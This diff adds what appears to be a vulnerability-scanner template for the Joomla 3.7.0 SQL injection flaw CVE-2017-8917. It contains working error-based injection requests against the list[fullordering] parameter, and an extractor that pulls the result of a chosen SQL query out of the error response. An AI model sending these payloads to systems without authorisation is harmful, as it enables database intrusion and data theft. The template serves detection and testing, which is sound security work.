@@ -1,0 +1,44 @@
+id: joomla-sqli-cve-2017-8917
+info:
+  name: Joomla 3.7.0 SQL Injection (CVE-2017-8917)
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    SQL injection vulnerability in Joomla! 3.7.x before 3.7.1 allows attackers to execute arbitrary SQL commands via unspecified vectors.
+  reference:
+    - https://github.com/vulhub/vulhub/tree/master/joomla/CVE-2017-8917
+  classification:
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cve-id: CVE-2017-8917
+  tags: sqli
+
+variables:
+  sql_payload: "select+database()"
+
+http:
+  - raw:
+      - |
+        GET /index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=1,updatexml(0x23,concat(0x7c,substring(md5(0x0c),1,10),0x7c),0x7c) HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "|58c89562f5|"
+        part: body
+
+  - raw:
+      - |
+        GET /index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x23,concat(1,({{sql_payload}})),1) HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+    extractors:
+      - type: regex
+        group: 1
+        regex:
+          - "XPATH syntax error:\\s+'(.*?)'"
